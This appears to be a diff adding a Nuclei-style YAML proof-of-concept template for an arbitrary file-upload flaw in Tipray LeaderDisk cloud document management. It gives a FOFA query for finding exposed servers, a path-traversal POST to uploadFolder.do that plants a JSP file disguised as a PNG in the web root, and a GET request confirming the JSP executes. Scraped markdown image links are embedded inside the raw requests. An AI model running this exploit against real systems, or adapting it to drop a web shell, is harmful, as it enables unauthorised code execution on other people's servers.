@@ -1,0 +1,64 @@
+id: poc-lnz5qapu8to0cc5r
+info:
+  name: 天锐绿盘云文档安全管理uploadFolder存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lnz5qapu8to0cc5r'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lnz5qapu8to0cc5r
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
+http:
+- raw:
+  - 'POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Length: [calculated_length]
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+    Content-Disposition: form-data; name="file"; filename="hello.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println("HelloWorld");%>
+
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711655617-bcb064c1-d676-401a-a9a2-6765fc61cf5f.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /hello.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711655813-86d2259c-44f0-4139-8c39-8030889d8e5c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
